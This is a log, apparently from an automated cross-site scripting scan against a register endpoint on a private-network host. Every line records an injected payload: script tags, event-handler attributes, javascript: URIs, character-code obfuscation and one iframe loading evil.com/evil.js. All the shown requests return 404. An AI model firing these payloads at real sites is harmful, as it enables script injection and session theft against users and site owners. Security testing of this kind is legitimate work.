+2025-01-29 22:53:05,080 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>window['eval']('alert("XSS")')</script>: 404
+2025-01-29 22:53:05,480 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:05,855 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Ewindow['setInterval']('alert("XSS")',%201000)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:05,857 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>window['setInterval']('alert("XSS")', 1000)</script>: 404
+2025-01-29 22:53:06,165 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:06,356 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Ewindow['setTimeout']('alert("XSS")',%201000)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:06,356 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>window['setTimeout']('alert("XSS")', 1000)</script>: 404
+2025-01-29 22:53:06,550 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:06,740 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Edocument.getElementById('myElem').innerHTML%20=%20'%3Cimg%20src="x"%20onerror="alert(1)"%20/%3E'%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:06,741 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>document.getElementById('myElem').innerHTML = '<img src="x" onerror="alert(1)" />'</script>: 404
+2025-01-29 22:53:06,950 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:07,138 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cscript%3Edocument.getElementById('myElem').innerHTML%20=%20"%3Cscript%3Ealert('XSS')%3C/script%3E"%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:07,138 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<script>document.getElementById('myElem').innerHTML = "<script>alert('XSS')</script>"</script>: 404
+2025-01-29 22:53:07,338 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:07,535 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Ciframe%20src="javascript:alert('XSS')"%20width="0"%20height="0"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:07,535 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<iframe src="javascript:alert('XSS')" width="0" height="0"></iframe>: 404
+2025-01-29 22:53:07,736 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:07,944 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Ciframe%20src="http://evil.com/evil.js"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:07,945 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<iframe src="http://evil.com/evil.js"></iframe>: 404
+2025-01-29 22:53:08,139 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:08,332 - INFO - HTTP Request: GET http://172.20.10.3/register&username=%3Cframe%20src="javascript:alert('XSS')"%3E%3C/frame%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:08,332 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&username=<frame src="javascript:alert('XSS')"></frame>: 404
+2025-01-29 22:53:08,522 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:08,715 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Ealert('XSS')%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:08,716 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>alert('XSS')</script>: 404
+2025-01-29 22:53:08,907 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:09,096 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cimg%20src="x"%20onerror="alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:09,096 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<img src="x" onerror="alert('XSS')">: 404
+2025-01-29 22:53:09,283 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:09,472 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Csvg/onload=alert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:09,473 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<svg/onload=alert('XSS')>: 404
+2025-01-29 22:53:09,670 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:09,865 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Ciframe%20src="javascript:alert('XSS')"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:09,866 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<iframe src="javascript:alert('XSS')"></iframe>: 404
+2025-01-29 22:53:10,056 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:10,245 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cbody%20onload=alert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:10,245 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<body onload=alert('XSS')>: 404
+2025-01-29 22:53:10,432 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:10,628 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Ca%20href="javascript:alert('XSS')"%3EClick%20me%3C/a%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:10,628 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<a href="javascript:alert('XSS')">Click me</a>: 404
+2025-01-29 22:53:10,826 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:11,021 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Csvg%3E%3Cscript%3Ealert('XSS')%3C/script%3E%3C/svg%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:11,021 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<svg><script>alert('XSS')</script></svg>: 404
+2025-01-29 22:53:11,214 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:11,405 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cmath%3E%3Cmtext%20onload="alert('XSS')"%3EXSS%3C/mtext%3E%3C/math%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:11,405 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<math><mtext onload="alert('XSS')">XSS</mtext></math>: 404
+2025-01-29 22:53:11,606 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:11,802 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Csvg/onload=alert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:11,803 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<svg/onload=alert('XSS')>: 404
+2025-01-29 22:53:12,000 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:12,202 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cembed%20src="javascript:alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:12,202 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<embed src="javascript:alert('XSS')">: 404
+2025-01-29 22:53:12,395 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:12,589 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cobject%20data="javascript:alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:12,589 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<object data="javascript:alert('XSS')">: 404
+2025-01-29 22:53:12,798 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:12,997 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cvideo%3E%3Csource%20onerror="alert('XSS')"%20src="x"%3E%3C/video%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:12,997 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<video><source onerror="alert('XSS')" src="x"></video>: 404
+2025-01-29 22:53:13,198 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:13,400 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Caudio%20onerror="alert('XSS')"%3E%3C/audio%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:13,401 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<audio onerror="alert('XSS')"></audio>: 404
+2025-01-29 22:53:13,605 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:13,804 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cdetails%20open%3E%3Csummary%20onclick="alert('XSS')"%3EXSS%3C/summary%3E%3C/details%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:13,805 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<details open><summary onclick="alert('XSS')">XSS</summary></details>: 404
+2025-01-29 22:53:14,006 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:14,195 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Carea%20shape="rect"%20coords="0,0,10,10"%20href="javascript:alert('XSS')"%20/%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:14,197 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<area shape="rect" coords="0,0,10,10" href="javascript:alert('XSS')" />: 404
+2025-01-29 22:53:14,386 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:14,579 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Ealert(document.cookie)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:14,579 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>alert(document.cookie)</script>: 404
+2025-01-29 22:53:14,771 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:14,963 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Ealert(location)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:14,963 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>alert(location)</script>: 404
+2025-01-29 22:53:15,155 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:15,359 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Ealert(1+1)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:15,360 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>alert(1+1)</script>: 404
+2025-01-29 22:53:15,550 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:15,749 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Eeval('alert("XSS")')%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:15,750 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>eval('alert("XSS")')</script>: 404
+2025-01-29 22:53:15,941 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:16,133 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Edocument.write("%3Cimg%20src='x'%20onerror='alert(1)'%20/%3E")%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:16,134 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>document.write("<img src='x' onerror='alert(1)' />")</script>: 404
+2025-01-29 22:53:16,328 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:16,522 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Csvg/onload="alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:16,522 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<svg/onload="alert('XSS')">: 404
+2025-01-29 22:53:16,712 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:16,902 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Ca%20href="javascript:alert('XSS')"%3EClick%20Here%3C/a%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:16,903 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<a href="javascript:alert('XSS')">Click Here</a>: 404
+2025-01-29 22:53:17,095 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:17,287 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cform%20action="javascript:alert('XSS')"%3E%3C/form%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:17,287 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<form action="javascript:alert('XSS')"></form>: 404
+2025-01-29 22:53:17,479 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:17,672 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Ciframe%20src="javascript:alert('XSS')"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:17,673 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<iframe src="javascript:alert('XSS')"></iframe>: 404
+2025-01-29 22:53:17,863 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:18,053 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cimg%20src="x"%20onerror="alert('XSS')"%20/%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:18,053 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<img src="x" onerror="alert('XSS')" />: 404
+2025-01-29 22:53:18,246 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:18,439 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cvideo%3E%3Csource%20onerror="alert('XSS')"%20src="x"%3E%3C/video%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:18,440 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<video><source onerror="alert('XSS')" src="x"></video>: 404
+2025-01-29 22:53:18,630 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:18,821 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Edocument.body.innerHTML%20=%20"%3Cimg%20src=x%20onerror=alert('XSS')%3E"%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:18,821 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>document.body.innerHTML = "<img src=x onerror=alert('XSS')>"</script>: 404
+2025-01-29 22:53:19,012 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:19,206 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Edocument.body.innerHTML%20=%20"%3Ca%20href=javascript:alert('XSS')%3Eclick%3C/a%3E"%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:19,206 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>document.body.innerHTML = "<a href=javascript:alert('XSS')>click</a>"</script>: 404
+2025-01-29 22:53:19,398 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:19,597 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Edocument.location="javascript:alert('XSS')"%20%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:19,598 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>document.location="javascript:alert('XSS')" </script>: 404
+2025-01-29 22:53:19,786 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:19,975 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Ewindow.location.href="javascript:alert('XSS')"%20%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:19,976 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>window.location.href="javascript:alert('XSS')" </script>: 404
+2025-01-29 22:53:20,163 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:20,357 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Elocation.replace("javascript:alert('XSS')")%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:20,357 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>location.replace("javascript:alert('XSS')")</script>: 404
+2025-01-29 22:53:20,553 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:20,744 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Edocument.write('%3Cscript%3Ealert("XSS")%3C/script%3E');%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:20,744 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>document.write('<script>alert("XSS")</script>');</script>: 404
+2025-01-29 22:53:20,945 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:21,142 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Ewindow.top.location='javascript:alert("XSS")';%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:21,142 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>window.top.location='javascript:alert("XSS")';</script>: 404
+2025-01-29 22:53:21,332 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:21,529 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cimg%20src="x"%20onerror="alert('XSS')"%20/%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:21,529 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<img src="x" onerror="alert('XSS')" />: 404
+2025-01-29 22:53:21,720 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:21,914 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cvideo%3E%3Csource%20onerror="alert('XSS')"%20src="x"%3E%3C/video%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:21,915 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<video><source onerror="alert('XSS')" src="x"></video>: 404
+2025-01-29 22:53:22,108 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:22,299 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Caudio%20onerror="alert('XSS')"%3E%3C/audio%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:22,300 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<audio onerror="alert('XSS')"></audio>: 404
+2025-01-29 22:53:22,489 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:22,684 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cembed%20src="javascript:alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:22,685 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<embed src="javascript:alert('XSS')">: 404
+2025-01-29 22:53:22,875 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:23,069 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Ciframe%20src="javascript:alert('XSS')"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:23,069 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<iframe src="javascript:alert('XSS')"></iframe>: 404
+2025-01-29 22:53:23,260 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:23,459 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Csvg/onload=alert(String.fromCharCode(88,83,83))%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:23,459 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<svg/onload=alert(String.fromCharCode(88,83,83))>: 404
+2025-01-29 22:53:23,649 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:23,841 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:23,841 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>alert(String.fromCharCode(88,83,83))</script>: 404
+2025-01-29 22:53:24,035 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:24,225 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Csvg%3E%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C/script%3E%3C/svg%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:24,225 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>: 404
+2025-01-29 22:53:24,416 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:24,608 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Csvg%3E%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C/script%3E%3C/svg%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:24,608 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>: 404
+2025-01-29 22:53:24,806 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:25,010 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:25,010 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E: 404
+2025-01-29 22:53:25,202 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:25,473 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:25,473 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E: 404
+2025-01-29 22:53:25,833 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:26,205 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:26,205 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E: 404
+2025-01-29 22:53:26,563 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:26,949 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:26,949 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E: 404
+2025-01-29 22:53:27,306 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:27,683 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Csvg%20onload%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:27,684 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=%3Csvg%20onload%3Dalert('XSS')%3E: 404
+2025-01-29 22:53:28,046 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:28,418 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Ciframe%20src%3Djavascript%3Aalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:28,418 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=%3Ciframe%20src%3Djavascript%3Aalert('XSS')%3E: 404
+2025-01-29 22:53:28,771 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:29,125 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:29,125 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E: 404
+2025-01-29 22:53:29,492 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:29,834 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Caudio%20onerror%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:29,835 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=%3Caudio%20onerror%3Dalert('XSS')%3E: 404
+2025-01-29 22:53:30,201 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:30,569 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cdetails%20open%3E%3Csummary%20onclick%3Dalert('XSS')%3EXSS%3C%2Fsummary%3E%3C%2Fdetails%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:30,570 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=%3Cdetails%20open%3E%3Csummary%20onclick%3Dalert('XSS')%3EXSS%3C%2Fsummary%3E%3C%2Fdetails%3E: 404
+2025-01-29 22:53:30,923 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:31,302 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cinput%20onfocus="alert('XSS')"%20autofocus%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:31,303 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<input onfocus="alert('XSS')" autofocus>: 404
+2025-01-29 22:53:31,663 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:32,029 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cimg%20src="x"%20onerror="alert(1)"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:32,029 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<img src="x" onerror="alert(1)">: 404
+2025-01-29 22:53:32,399 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:32,789 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Ca%20href="javascript:alert('XSS')"%3EClick%20me%3C/a%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:32,790 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<a href="javascript:alert('XSS')">Click me</a>: 404
+2025-01-29 22:53:33,161 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:33,529 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cbutton%20onclick="alert('XSS')"%3EClick%20me%3C/button%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:33,530 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<button onclick="alert('XSS')">Click me</button>: 404
+2025-01-29 22:53:33,890 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:34,262 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cinput%20type="button"%20value="Click%20me"%20onclick="alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
